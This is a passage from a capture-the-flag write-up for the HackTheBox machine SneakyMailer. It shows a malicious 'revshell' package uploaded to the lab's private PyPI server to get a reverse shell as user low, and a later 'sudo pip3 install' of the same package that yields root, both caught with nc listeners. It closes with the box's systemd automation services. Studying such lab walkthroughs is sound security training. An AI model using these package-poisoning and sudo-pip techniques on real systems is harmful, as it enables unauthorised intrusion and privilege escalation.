copying revshell.egg-info/PKG-INFO -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/SOURCES.txt -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/dependency_links.txt -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/not-zip-safe -> revshell-0.0.1/revshell.egg-info
copying revshell.egg-info/top_level.txt -> revshell-0.0.1/revshell.egg-info
Writing revshell-0.0.1/setup.cfg
Creating tar archive
removing 'revshell-0.0.1' (and everything under it)
running upload
Submitting dist/revshell-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080
Server response (200): OK

```

If I hurry and load `http://pypi.sneakycorp.htb:8080/simple`, the package is listed:

![image-20200713071533459](https://0xdfimages.gitlab.io/img/image-20200713071533459.png)

It disappears very quickly (it seems low is quick to react and clean up). But a few seconds later, `nc` receives a connection with a shell as low:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:56400.
$ id
uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)

```

And low can access `user.txt`:

```

$ cat user.txt
13164fcd************************

```

## Priv: low –> root

### Enumeration

Listing commands low can run as other users with `sudo -l` shows the next step very clearly:

```

low@sneakymailer:/$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3

```

### sudo pip

This is the same privesc as [Canape](/2018/09/15/htb-canape.html#sudo-pip), and really, the same as the previous step, just way simpler. I’ll use Python’s webserver to host my `setup.py` file from the package, and use `wget` on SneakyMailer to save a copy in `/dev/shm`.

Then I just run with the `install` command passing the current directory:

```

low@sneakymailer:/dev/shm$ sudo pip3 install .
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /dev/shm
Building wheels for collected packages: revshell
  Running setup.py bdist_wheel for revshell ... -

```

It hangs here, but at a `nc` listener there’s a root shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:57612.
# id  
uid=0(root) gid=0(root) groups=0(root)

```

And I can grab `root.txt`:

```

# cat root.txt
19eb3f51************************

```

## Beyond Root

There’s a *ton* of automation in this box. I’m not going to go through it all, but I’d recommend that you do (it’s still available to free users for the first two weeks post retirement). There’s a folder with scripts that each user runs:

```

root@sneakymailer:/opt/scripts# find . -type f
./vmail/imap-user-login.py        <-- send POST to links
./vmail/restore-sent-mail-box.py  <-- keep only two messages in mailbox
./low/install-module.sh           <-- runs python $1 install
./low/install-modules.py          <-- checks for packages, downloads, calls install-module.sh, cleans up
./developer/clean-ftp.py          <-- removes webshells and other uploads

```

These scripts are well done, and worth reading.

What I found interesting and wanted to highlight here is *how* they run. I checked crons and systemd timers, and no sign of them. I would see in the process list that vmail and developer both always had `sleep` processes, which but no parent process that like a script in an infinite loop.

It turns out that the box author uses services in a clever way to make these periodic scripts. Each service is defined in `/etc/systemd/system`:

```

root@sneakymailer:/etc/systemd/system# find . -name '*.service'
./getty.target.wants/getty@tty1.service
./bot-imap-user.service                   # Automation service
./dbus-org.freedesktop.timesync1.service
./install-modules.service                 # Automation service
./network-online.target.wants/networking.service
./sysinit.target.wants/systemd-timesyncd.service
./sysinit.target.wants/apparmor.service
./sysinit.target.wants/keyboard-setup.service
./clean-ftp.service                       # Automation service
./dbus-fi.w1.wpa_supplicant1.service
./bluetooth.target.wants/bluetooth.service
./dbus-org.bluez.service
./sshd.service
...[snip]...
./syslog.service
./open-vm-tools.service.requires/vgauth.service
./restore-sent-mail-box.service           # Automation service
./pypi.service

```

For each service that needs to run periodically, the author uses `Restart=always` so that when the service finishes, it just starts again, and typically includes a `ExecStartPre=/bin/sleep 10` to space out the executions. For example, `bot-imap-user.service`:

```

[Unit]
After=network.target

[Service]
Type=simple
Restart=always
User=vmail
ExecStartPre=/bin/sleep 10
ExecStart=/home/vmail/venv/bin/python /opt/scripts/vmail/imap-user-login.py

[Install]
WantedBy=multi-user.target

```

There are four automation services written for SneakyMailer:

| Service | User | Script (in /opt/scripts) | Sleep | Notes |
| --- | --- | --- | --- | --- |
| `bot-imap-user` | vmail | `vmail/imap-user-login.py` | 10s | Reads mail, “clicks” phish |
| `install-modules` | low | `low/install-modules.py` | 10s | Downloads modules and runs |
| `clean-ftp` | developer | `developer/clean-ftp.py` | 60s | Removes files from dev webserver |
| `restore-sent-mail-box` | vmail | `vmail/restore-sent-mail-box.py` | 10s | Reset mailbox |